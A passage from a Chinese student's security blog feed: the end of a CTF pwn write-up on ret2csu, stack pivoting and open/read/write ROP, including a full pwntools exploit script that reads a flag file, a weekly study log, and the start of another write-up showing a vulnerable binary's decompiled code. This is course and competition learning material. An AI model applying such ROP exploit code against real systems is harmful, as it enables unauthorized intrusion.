pwn中常用的技术，可用于在程序没有可用的gadget的情况下构造ROP链。它利用了一个特殊的函数__libc_csu_init来调用函数，并利用程序的堆栈来构造ROP链。</p>\n<h2 id=\"四-栈迁移\"><a href=\"#四-栈迁移\" class=\"headerlink\" title=\"四. 栈迁移\"></a>四. 栈迁移</h2><p>​\t\t可用于在程序栈空间不足的情况下，通过将栈迁移到bss段、堆等来执行攻击,也可以利用sub rsp等gadget来增加栈的长度.通常使用的是leave;ret;方法,第一次leave;ret;控制rbp,第二次可以控制rsp</p>\n<h1 id=\"第三章-错误处理\"><a href=\"#第三章-错误处理\" class=\"headerlink\" title=\"第三章 错误处理\"></a>第三章 错误处理</h1><h2 id=\"一-open时出错\"><a href=\"#一-open时出错\" class=\"headerlink\" title=\"一. open时出错\"></a>一. open时出错</h2><p>​\t\tbss段给的地址太小,在动态解析的时候,栈会移动到不可写的地方,导致出错,将bss往后移动多一点即可</p>\n<h2 id=\"二-orw-不设置rdx-本地可以打通-远程不可以\"><a href=\"#二-orw-不设置rdx-本地可以打通-远程不可以\" class=\"headerlink\" title=\"二. orw(不设置rdx) 本地可以打通,远程不可以\"></a>二. orw(不设置rdx) 本地可以打通,远程不可以</h2><p>​\t\t是libc版本的问题,把版本切换到2.27(题目版本)后即可发现,在read时,rdx被设置为了0,因此需要找到能够设置rdx的gadget</p>\n<h2 id><a href=\"#\" class=\"headerlink\" title></a></h2><h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://blog.csdn.net/qq_34010404/article/details/123809796\">https://blog.csdn.net/qq_34010404&#x2F;article&#x2F;details&#x2F;123809796</a></p>\n<p><a href=\"https://blog.csdn.net/mcmuyanga/article/details/113389703\">https://blog.csdn.net/mcmuyanga/article/details/113389703</a></p>\n<p><a href=\"https://blog.csdn.net/qq_45691294/article/details/112196127\">https://blog.csdn.net/qq_45691294&#x2F;article&#x2F;details&#x2F;112196127</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41696518/article/details/126665825\">https://blog.csdn.net/qq_41696518&#x2F;article&#x2F;details&#x2F;126665825</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41202237/article/details/105913597\">https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;105913597</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12189\">https://xz.aliyun.com/t/12189</a></p>\n<h1 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录:\"></a>附录:</h1><h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;xxx&quot;,xxx)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;xxxx&quot;</span>,<span class=\"number\">52017</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh = process(&quot;./rop&quot;)</span></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x0040131E&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">bssaddr = <span class=\"number\">0x0040412C</span> + <span class=\"number\">0xd00</span></span><br><span class=\"line\">retaddr = <span class=\"number\">0x0000401304</span></span><br><span class=\"line\">readaddr = <span class=\"number\">0x0004010D0</span></span><br><span class=\"line\">openaddr = <span class=\"number\">0x00401100</span></span><br><span class=\"line\">writeaddr = <span class=\"number\">0x0004010C0</span></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x0000000000401460</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x000000000040147a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class=\"line\">    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payloadtemp += p64(csu_front_addr)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> payloadtemp</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">csu2</span>(<span class=\"params\">rbp, r12, r13, r14, r15</span>):</span><br><span class=\"line\">    payloadtemp = p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payloadtemp += p64(csu_front_addr)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> payloadtemp</span><br><span class=\"line\"></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&quot;choice:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4919</span>))</span><br><span class=\"line\">payload =<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">256</span> + p64(bssaddr) + p64(retaddr)</span><br><span class=\"line\"><span class=\"comment\"># 40413c</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">poprdi = <span class=\"number\">0x0000401483</span></span><br><span class=\"line\">poprsi = <span class=\"number\">0x0000401481</span></span><br><span class=\"line\">bssaddr2 = bssaddr + <span class=\"number\">0x20</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x0040131E</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = p64(poprdi) + p64(<span class=\"number\">0</span>) + p64(poprsi)+ p64(bssaddr2) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)</span><br><span class=\"line\">temp = csu(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,bssaddr2,<span class=\"number\">50</span>,<span class=\"number\">0x404e0c</span>)</span><br><span class=\"line\">payload1 += temp</span><br><span class=\"line\">temp2 = csu(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,bssaddr2,<span class=\"number\">50</span>,<span class=\"number\">0x404e14</span>)</span><br><span class=\"line\">payload1 += temp2 + p64(readaddr) + p64(writeaddr)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;len:&quot;</span>,<span class=\"built_in\">len</span>(payload1))</span><br><span class=\"line\">payload1 = payload1.ljust(<span class=\"number\">0x100</span>,<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">payload1 +=  p64(bssaddr-<span class=\"number\">0x108</span>) + p64(leave_ret)</span><br><span class=\"line\">sh.send(payload1)</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;./flag\\x00&quot;</span>)</span><br><span class=\"line\">sh.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/",
            "url": "https://tangzichengcc.github.io/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/",
            "title": "成长之路—学习周报",
            "date_published": "2023-03-28T00:46:24.000Z",
            "content_html": "<h1 id=\"2023年\"><a href=\"#2023年\" class=\"headerlink\" title=\"2023年\"></a>2023年</h1><h3 id=\"第一周-3-27-4-2\"><a href=\"#第一周-3-27-4-2\" class=\"headerlink\" title=\"第一周(3.27-4.2)\"></a>第一周(3.27-4.2)</h3><p>1.高级网络攻防练习题1(栈迁移、orw、ret2csu),简单学了下第二题堆的两个漏洞原理(largebinattack &amp; poison null byte)</p>\n<p>2.精读论文并准备pre的ppt</p>\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity22/presentation/myung\">https://www.usenix.org/conference/usenixsecurity22/presentation/myung</a></p>\n<p>3.补天10周年活动,志愿者、 制作学术道德视频</p>\n<h3 id=\"第二周-4-3-4-9\"><a href=\"#第二周-4-3-4-9\" class=\"headerlink\" title=\"第二周(4.3-4.9)\"></a>第二周(4.3-4.9)</h3><p>1.高级攻防writeup,主要练习规范和画图</p>\n<p>2.虚拟化pre+分析博客</p>\n<p>3.阅读分析malloc源码,分析largebin漏洞</p>\n<p>4.栈迁移三道练习题目</p>\n<p>5.读论文: MOZE(自动化堆风水)和一篇综述(内存安全)</p>\n<p>Maze: Towards Automated Heap Feng Shui</p>\n<p>SoK: Eternal War in Memory</p>\n<p>6.做了一点但不多: 阅读afl源码、软件漏洞分析与挖掘作业,逆向题以及整合ppt、pwn一键搭建环境脚本</p>\n<h3 id=\"第三周-4-10-4-16\"><a href=\"#第三周-4-10-4-16\" class=\"headerlink\" title=\"第三周(4.10-4.16)\"></a>第三周(4.10-4.16)</h3><p>不要惧怕畏惧自己不擅长的,以及觉得自己不喜欢学的,比如AI,早晚可能会用到,所以该学还得学!!</p>\n<p>1.精读论文,制作ppt和讲稿pre:自动化堆风水</p>\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity22/presentation/myung\">https://www.usenix.org/conference/usenixsecurity22/presentation/myung</a></p>\n<p>2.三道栈迁移博客 + 5道题练习</p>\n<p>3.uaf学习和题目练习</p>\n<p>4.<a href=\"https://www.icourse163.org/course/NJU-1001625001\">计算机系统基础(一)：程序的表示、转换与链接</a> 看了四章节左右</p>\n<h3 id=\"第四周-4-17-4-23\"><a href=\"#第四周-4-17-4-23\" class=\"headerlink\" title=\"第四周(4.17-4.23)\"></a>第四周(4.17-4.23)</h3><p>1.红明谷杯+中国海洋大学ctf、月赛pwn出题</p>\n<p>2.计算机基础看了两章节左右、csapp做了半章习题</p>\n<p>3.移动安全作业,大概读了一下demo的代码</p>\n<p><a href=\"https://github.com/song-dev/device-info\">https://github.com/song-dev/device-info</a></p>\n<h3 id=\"第五周-4-24-4-30\"><a href=\"#第五周-4-24-4-30\" class=\"headerlink\" title=\"第五周(4.24-4.30)\"></a>第五周(4.24-4.30)</h3><p>这一周上到一半就开始准备五一出去玩了…导致干的活不是很多…</p>\n<p>1.南大cs基础继续看,快看完了,csapp第三章做到一半多了</p>\n<p>2.复习和学习了一下域渗透、Linux后门</p>\n<p>3.移动安全作业,就简单的读懂了实现逻辑,添加了一个读取通讯录的功能</p>\n<h3 id=\"第六周-5-1-5-7\"><a href=\"#第六周-5-1-5-7\" class=\"headerlink\" title=\"第六周(5.1-5.7)\"></a>第六周(5.1-5.7)</h3><p>1.cpp学习了两章</p>\n<p>2.学习了一点域渗透</p>\n<p>3.做了一个csapp实验(二进制炸弹)</p>\n<h3 id=\"第七周-5-8-5-14\"><a href=\"#第七周-5-8-5-14\" class=\"headerlink\" title=\"第七周(5.8-5.14)\"></a>第七周(5.8-5.14)</h3><p>1.totolink T10 路由器 环境搭建 业务分析 漏洞复现</p>\n<h3 id=\"第八周-5-15-5-21\"><a href=\"#第八周-5-15-5-21\" class=\"headerlink\" title=\"第八周(5.15-5.21)\"></a>第八周(5.15-5.21)</h3><p>1.周六月赛,做了一天</p>\n<p>寄……摆了一星期</p>\n<h3 id=\"第九周-5-22-5-28\"><a href=\"#第九周-5-22-5-28\" class=\"headerlink\" title=\"第九周(5.22-5.28)\"></a>第九周(5.22-5.28)</h3><p>1.过了音乐考试、游泳考试、软件漏洞分析与发现考试!</p>\n<p>2.做了一点组里的活</p>\n<h3 id=\"第十周-5-29-6-4\"><a href=\"#第十周-5-29-6-4\" class=\"headerlink\" title=\"第十周(5.29-6.4)\"></a>第十周(5.29-6.4)</h3><p>1.高级网络攻防考试,以及学了一下offbyone,</p>\n<p>2.dasctf 二进制专项比赛</p>\n<h3 id=\"第十一周-6-5-6-11\"><a href=\"#第十一周-6-5-6-11\" class=\"headerlink\" title=\"第十一周(6.5-6.11)\"></a>第十一周(6.5-6.11)</h3><p>1.升级赛…条件竞争…得好好看看pwncollege了..要学的还很多</p>\n<p>2.这周忘了干啥…感觉时间比较零碎…(还是尽量不要把时间打的太散比较好,可以安排一块时间处理散乱的事情)</p>\n<h3 id=\"第十二周-6-12-6-18\"><a href=\"#第十二周-6-12-6-18\" class=\"headerlink\" title=\"第十二周 (6.12 - 6.18)\"></a>第十二周 (6.12 - 6.18)</h3><p>1.夏季学期云安全存储实践系统的前端(QT、C++实现)</p>\n<p>2.乙队月赛,终于拿到第一名了!拿到奖金了!!,虽然成长缓慢,但是从最初的菜鸡,一道题也做不出来,也看不懂,到现在基本都有思路,简单一点的话能AK,还是有点长进的,算是一点小小的欣慰吧,继续加油!!!</p>\n<h3 id=\"第十三-十六周-6-19-7-16\"><a href=\"#第十三-十六周-6-19-7-16\" class=\"headerlink\" title=\"第十三 - 十六周(6.19 - 7.16)\"></a>第十三 - 十六周(6.19 - 7.16)</h3><p>休息. 旅游</p>\n<h3 id=\"第十七周-7-17-7-23\"><a href=\"#第十七周-7-17-7-23\" class=\"headerlink\" title=\"第十七周 7.17-7.23\"></a>第十七周 7.17-7.23</h3><p>1.虚拟化入门,了解了下虚拟化</p>\n<p>2.忘了..好像在摸鱼</p>\n<h3 id=\"第十八周-7-24-7-30\"><a href=\"#第十八周-7-24-7-30\" class=\"headerlink\" title=\"第十八周 7.24 - 7.30\"></a>第十八周 7.24 - 7.30</h3><p>1.虚拟化 了解CPU相关, 看了一下KVM源码</p>\n<p>2.pwn学了两种手法</p>\n<p>3.回工位装系统装环境….遇到了很奇怪的问题..拆机+反复装系统,感觉挺好玩的….</p>\n<h3 id=\"第十九周-7-31-8-6\"><a href=\"#第十九周-7-31-8-6\" class=\"headerlink\" title=\"第十九周 7.31 - 8.6\"></a>第十九周 7.31 - 8.6</h3><p>在家躺着</p>\n<h3 id=\"第二十-二十二周8-7-27\"><a href=\"#第二十-二十二周8-7-27\" class=\"headerlink\" title=\"第二十-二十二周8.7-27\"></a>第二十-二十二周8.7-27</h3><p>hw</p>\n<h3 id=\"第二十三周-8-28-9-3\"><a href=\"#第二十三周-8-28-9-3\" class=\"headerlink\" title=\"第二十三周 8.28-9.3\"></a>第二十三周 8.28-9.3</h3><p>看内存虚拟化、云原生安全</p>\n<h3 id=\"第二十四周-9-4-9-10\"><a href=\"#第二十四周-9-4-9-10\" class=\"headerlink\" title=\"第二十四周 9.4-9.10\"></a>第二十四周 9.4-9.10</h3><p>月赛出题3道</p>\n<h3 id=\"第二十五周-9-11-9-17\"><a href=\"#第二十五周-9-11-9-17\" class=\"headerlink\" title=\"第二十五周 9.11 - 9.17\"></a>第二十五周 9.11 - 9.17</h3><p>对象生病,陪护住院</p>\n<h3 id=\"第二十六周-9-18-9-24\"><a href=\"#第二十六周-9-18-9-24\" class=\"headerlink\" title=\"第二十六周 9.18 - 9.24\"></a>第二十六周 9.18 - 9.24</h3><p>调研</p>\n<p>各种小事</p>\n<p>brics ctf</p>\n<h3 id=\"第二十七周-9-25-10-1\"><a href=\"#第二十七周-9-25-10-1\" class=\"headerlink\" title=\"第二十七周 9.25 - 10.1\"></a>第二十七周 9.25 - 10.1</h3><p>回炉重造c,打基础</p>\n<p>打升级赛: 意识到自己还有差距,不过目标更清晰了</p>\n<h3 id=\"第二十八周-10-2-10-8\"><a href=\"#第二十八周-10-2-10-8\" class=\"headerlink\" title=\"第二十八周 10.2 - 10.8\"></a>第二十八周 10.2 - 10.8</h3><p>玩</p>\n<h3 id=\"第二十九周-10-9-10-15\"><a href=\"#第二十九周-10-9-10-15\" class=\"headerlink\" title=\"第二十九周 10.9 - 10.15\"></a>第二十九周 10.9 - 10.15</h3><p>调研弹性计算相关内容</p>\n<h3 id=\"第三十周10-16-10-22\"><a href=\"#第三十周10-16-10-22\" class=\"headerlink\" title=\"第三十周10.16 - 10.22\"></a>第三十周10.16 - 10.22</h3><p>学习rust,完成入门100题</p>\n<h3 id=\"第三十一周-10-23-10-29\"><a href=\"#第三十一周-10-23-10-29\" class=\"headerlink\" title=\"第三十一周 10.23-10.29\"></a>第三十一周 10.23-10.29</h3><p>我忘了…</p>\n<h3 id=\"第三十二周-10-30-11-5\"><a href=\"#第三十二周-10-30-11-5\" class=\"headerlink\" title=\"第三十二周 10.30 - 11.5\"></a>第三十二周 10.30 - 11.5</h3><p>月赛、组里活、c基础回顾</p>\n<p>记录的越来越潦草了…得警醒一下, 同时感觉自己每周做的事情太杂了,太分散了,或许需要调整一下策略</p>\n<h3 id=\"第三十三周-11-6-11-12\"><a href=\"#第三十三周-11-6-11-12\" class=\"headerlink\" title=\"第三十三周 11.6-11.12\"></a>第三十三周 11.6-11.12</h3><p>1.glibc调试、月赛题目复盘分析、c书最后小实验</p>\n<p>2.做了几道练习题,学了几种新的手法</p>\n<p>3.看了点namespace隔离</p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-23-pwn-college-Fundamentals-Program-Interaction/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-23-pwn-college-Fundamentals-Program-Interaction/",
            "title": "pwn入门-23-pwn-college_Fundamentals_Program_Interaction",
            "date_published": "2023-03-23T06:48:10.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"08bc550c0edbcb3fe8369a6b8d9fc34d984017a327627b3d21107df6d5def395\">297f05f60dc60df7ad3147a64b55ba41ef632e7886bb70583f539f79dc665bd91c6dfb281a95c83b3f586677bfbacee5619cc440a2a39527bc1daaadd221f0a47bac954bf7833a08ccf0244f0c6223062aa0c91627c11d4d7dda024c87510b8fa2a2d65e4ed0e87cccb67cfa9efcd2162588bd631c2cfff823b9dc7239882caba90b3045af0e2877fdbe08ee4114bcf8fc85883a75bd443e78ab3d7eba34a297712270a123b0c88d1a8f2ba71b14184d4ae56dfbadc0ab2ee842dd24ffbdb371d8e96303e33be07ff7c5bff09b924db81840ceca18a668c6466dbcbce33837da8dd9395ec835e2ec5b3bac35f4fedfa8927c9ab34210b69142e5fd6d9b2bee0b4a376bdc7c6e59f8b0052cc7cdb57ab23a8e6329cc868570031411e6492509030f2574b196ddfd93e61b3b887789613a22b4d9c1d8dc37a3c9e8bd7b696f72e11e9a71328eb8304641842ad2d8ea18f87a0413317acb21e00237a48a7db823aa188a8ce2d693b055a0877d5312d3e2e08353b8e84fdf82ab5ff97bff097c3eef561b882de9143ab02a870ac4181db8a4ae522b20066fa69e0efb19d46164b5dbec3558aea1e2dcc3e3102f9df6b4636ef48505a11304363ae0f771ca0a1056625cf7aa7e0acbce7b3d09bf4cd864358fc668240774b1126d92a87cda62e098f9e61d0e1f89e3346231f05a076a65b3805a39d278e2516ade05a5485bf423c3ca1160f8cfc59c41ca7f130bf675a3bbaa15fb87a8277e61bf53bff5c2d1d7c0d1455c4bcb2264f40b38e40fcfca9a04c71380d6c10c614503f2e9ed9574716d3f475408a21460063e650e8fa39276e341c7cfd798202fd76bd79998e1436817ba77f4d63a3c4269c0487ad8ec8bf57bf509c8e0efa8184a3de1af25c4bbdfc6b6f9e9dfe10767e0820cd6de6f361113e6ed50ecdbc2f0943fb2a50584440b56e31364aa430d9015b1e826c0f5ee4c86da9536642fc2d9817f7c71c40b7b8a429eaec480d9d1d5c6c5bbfec678e8f0a4579638462189c75a92ee6347960aad8ef7663dce55bd70fadee82c26fc861ac79731328a16b2f0dc6990cedd25673b794dd443421b87b5079245f08057321ca94d03943efc8a4d9718e602a7ac8a998c3ee5f520a45608aac42b89f1673b762c8ff043b1d9109cf27dd5b48ed1ccaab806ee6c947c9e07778bc9c93ba6e2a00bd4179d8baa6b0b7aaae16aff24e93208cbd2daf875ba9faf4202afe16992e319d61b4217c47cbc1d06cf48893f6fba2fe32f1bad4d20de0387a44aa27913f95209011fa381f39f4abb3f8528dc556939c8fa621f2f40a2fcc28ffe7bbe1aad194680dcd08005928949166f77bfe4383bf0a3de0860eac7da6be4fdc04e2ee6375b7348d2f4a31d56341165746c9e7771e3dc1190811c2d1f48929fa7849de57491f4df273595dcda76ca1fe2e179fe1ad405bae35c36b6fd5882a61d43ea80c8f3fc52fc19d4d0e8e2ba4423286845cb584bb73dea59d938a8389e5268f65814103345c58105d0249dc534fcde471ce4ab1d0daf2e948bc4752b4f28ffae12deee29037a8300263f0fda47c2164aeb8a0311e2938f9cb98db27a0f88d75fb9972d4f85edd70b1bf5db7feb8dd4c1aeb130cf9f1028d0a043c1550734f89ab9ddd007fc99047901218c3930e53ef06c76c5199a6b62a25b0d329bde8c6f7d43319c7f3d59454a104b5e456cb60bd209348f1699a2c6e8cbd783884ea24cc7649476cb7386fa174779a94644dc6c0407ec784a0351fc0139509a2db7843d129533d6a52c458f3d903bd525cdfbcc45c92195407fd35ba6493f8ceb33110ad3963ea25402301dd07c1d5e35419c3e1f7d9bc7c50c0f1505fe1436a379a312616495642905d00b71718b9cdaa2a364d95f58a642054965a4a69a3282d131291f97dcf19139d99cb5e776c10d1c81af98491631e89909483908605fdd036dd069135ea17b37d125dc4028ba2c94b90511be379159ebf9eef389b4700586e7f96869d365552995894eb55e506e0b846d4fc2b4e1873971a7e8aa8c5ff0a0437a6415f177259c855c711e1cd5d0a71da4b26d8f0016b5b41f41c2f9ef7a51b1860f265607ecd9d7b37c74e25599ce3606e952db86</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/",
            "title": "pwn入门-22-ucas课堂练习rop之orw",
            "date_published": "2023-03-17T05:59:53.000Z",
            "content_html": "<p>题目链接: <a href=\"https://tangzichengcc.github.io/2023/03/17/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/rop\">https://tangzichengcc.github.io/2023/03/17/pwn入门-22-ucas课堂练习rop之orw/rop</a></p>\n<p>​\t\t课上的一个小练习,理论上应该不难的..但是卡了很久…因为基础不牢+菜</p>\n<h1 id=\"反汇编代码查看\"><a href=\"#反汇编代码查看\" class=\"headerlink\" title=\"反汇编代码查看\"></a>反汇编代码查看</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"number\">-1</span>;</span><br><span class=\"line\">  install_seccomp(argc, argv, envp);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stderr</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to the Santa&#x27;s gift!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;your choice:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">4919</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    vuln();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">9011</span> )</span><br><span class=\"line\">      _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">    some_gifts();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">256</span>]; <span class=\"comment\">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">some_gifts</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">16</span>]; <span class=\"comment\">// [rsp+0h] [rbp-1010h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> fd; <span class=\"comment\">// [rsp+100Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  fd = sys_open(<span class=\"string\">&quot;./gifts.txt&quot;</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x1000</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( read(fd, s, <span class=\"number\">0x1000</span>uLL) &lt; <span 